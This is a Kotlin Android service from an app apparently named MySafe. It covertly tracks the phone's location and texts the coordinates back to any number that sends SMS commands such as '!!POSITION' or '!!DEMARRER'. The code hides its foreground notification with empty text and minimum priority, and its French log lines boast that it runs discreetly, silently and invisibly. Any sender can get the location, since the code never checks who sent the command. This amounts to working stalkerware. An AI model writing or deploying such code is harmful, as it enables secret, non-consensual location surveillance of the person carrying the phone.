package com.mysafe.mysafe

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Build
import android.os.Bundle
import android.telephony.SmsManager
import android.util.Log
import androidx.core.content.ContextCompat

class MySafeAgentService : Service() {
    companion object {
        const val ACTION_SEND_COMMAND = "com.mysafe.mysafe.SEND_CMD"
        const val ACTION_PROCESS_COMMAND = "com.mysafe.mysafe.PROCESS_CMD"
        const val SMS_RECEIVED = "com.mysafe.mysafe.SMS_RECEIVED"
        private const val TAG = "MySafe"
        private const val NOTIF_ID = 12345
        private const val CHANNEL_ID = "MySafeGPS"
    }

    private lateinit var locationManager: LocationManager
    private lateinit var smsManager: SmsManager
    private var locationListener: LocationListener? = null
    private var targetNumber: String? = null
    private var isTracking = false

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "✅ SERVICE MySafe CRÉÉ — Mode discret 🤫")
        locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
        smsManager = SmsManager.getDefault()
        createNotificationChannel()
        startForegroundSafety()
        startGpsListening()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val chan = NotificationChannel(CHANNEL_ID, "MySafe GPS", NotificationManager.IMPORTANCE_LOW).apply {
                description = "Service de localisation — discret"
                lightColor = Color.TRANSPARENT
                enableLights(false)
                enableVibration(false)
                setShowBadge(false)
            }
            (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(chan)
        }
    }

    private fun startForegroundSafety() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
            ContextCompat.checkSelfPermission(this, android.Manifest.permission.POST_NOTIFICATIONS)
            != PackageManager.PERMISSION_GRANTED
        ) return
        val notif = Notification.Builder(this, CHANNEL_ID)
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(android.R.drawable.ic_menu_mylocation)
            .setOngoing(true)
            .setPriority(Notification.PRIORITY_MIN)
            .build()
        startForeground(NOTIF_ID, notif)
    }

    private fun startGpsListening() {
        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION)
            != PackageManager.PERMISSION_GRANTED
        ) return
        locationListener = object : LocationListener {
            override fun onLocationChanged(l: Location) {
                if (isTracking && targetNumber != null) {
                    sendPositionToTarget(l)
                }
            }
            override fun onProviderEnabled(p: String) = Unit
            override fun onProviderDisabled(p: String) = Unit
        }
        try {
            locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 90000L, 10f, locationListener!!)
            locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 90000L, 10f, locationListener!!)
            Log.d(TAG, "🟢 GPS ACTIF — discret, silencieux, invisible")
        } catch (e: Exception) { Log.e(TAG, "❌ GPS: ${e.message}") }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        intent?.let {
            when (it.action) {
                ACTION_SEND_COMMAND -> {
                    val target = it.getStringExtra("target_number") ?: return@let
                    val cmd = it.getStringExtra("command") ?: return@let
                    sendCommandToTarget(target, cmd)
                }
                ACTION_PROCESS_COMMAND -> {
                    val sender = it.getStringExtra("sender_number") ?: return@let
                    val cmd = it.getStringExtra("command") ?: return@let
                    processIncomingCommand(sender, cmd)
                }
            }
        }
        return START_STICKY
    }

    private fun sendCommandToTarget(target: String, command: String) {
        Log.d(TAG, "📤 Envoi commande '$command' à $target")
        try {
            smsManager.sendTextMessage(target, null, command, null, null)
            Log.d(TAG, "✅ Commande envoyée — invisible dans la messagerie 🤫")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Échec envoi : ${e.message}")
        }
    }

    private fun processIncomingCommand(sender: String, command: String) {
        Log.d(TAG, "📥 Commande reçue de $sender : $command — traitement silencieux 🤫")
        targetNumber = sender
        
        when (command.uppercase()) {
            "!!POSITION" -> sendMyPositionBack(sender)
            "!!DEMARRER" -> startTrackingMode(sender)
            "!!STOP" -> stopTrackingMode()
        }
    }

    private fun sendMyPositionBack(to: String) {
        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION)
            != PackageManager.PERMISSION_GRANTED
        ) return
        
        try {
            val loc = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                ?: locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            
            if (loc != null && loc.latitude != 0.0 && loc.longitude != 0.0) {
                val msg = "!!${loc.latitude},${loc.longitude},${loc.altitude.toInt()}"
                smsManager.sendTextMessage(to, null, msg, null, null)
                Log.d(TAG, "✅ Position renvoyée silencieusement 🤫")
            } else {
                Log.d(TAG, "⚠️ Pas de position disponible")
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Erreur position : ${e.message}")
        }
    }

    private fun startTrackingMode(sender: String) {
        targetNumber = sender
        isTracking = true
        Log.d(TAG, "🟢 SUIVI CONTINU DÉMARRÉ — toutes les 1min30 🤫")
    }

    private fun stopTrackingMode() {
        isTracking = false
        targetNumber = null
        Log.d(TAG, "⏹️ SUIVI ARRÊTÉ")
    }

    private fun sendPositionToTarget(loc: Location) {
        if (targetNumber == null || loc.latitude == 0.0 && loc.longitude == 0.0) return
        val msg = "!!${loc.latitude},${loc.longitude},${loc.altitude.toInt()}"
        try {
            smsManager.sendTextMessage(targetNumber, null, msg, null, null)
            Log.d(TAG, "📤 Position envoyée silencieusement 🤫")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Échec envoi position : ${e.message}")
        }
    }

    override fun onBind(i: Intent?) = null

    override fun onDestroy() {
        super.onDestroy()
        locationListener?.let { locationManager.removeUpdates(it) }
    }
}
